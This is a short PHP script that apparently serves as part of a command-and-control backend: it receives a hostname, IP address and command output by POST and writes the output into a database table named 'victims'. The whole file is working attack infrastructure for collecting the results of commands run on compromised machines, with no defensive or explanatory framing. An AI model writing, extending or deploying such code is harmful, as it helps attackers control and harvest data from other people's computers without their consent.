<?php
include 'conn.php';


if($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["hostname"]) && isset($_POST["ip"]) && isset($_POST["result"]))
{
$takeResultsQuery = $mysql->prepare("update victims set commandresult=? where hostname=? and ipaddress=?");
$takeResultsQuery->bind_param("sss", $_POST["result"], $_POST["hostname"], $_POST["ip"]);
$takeResultsQuery->execute();
}



 ?>

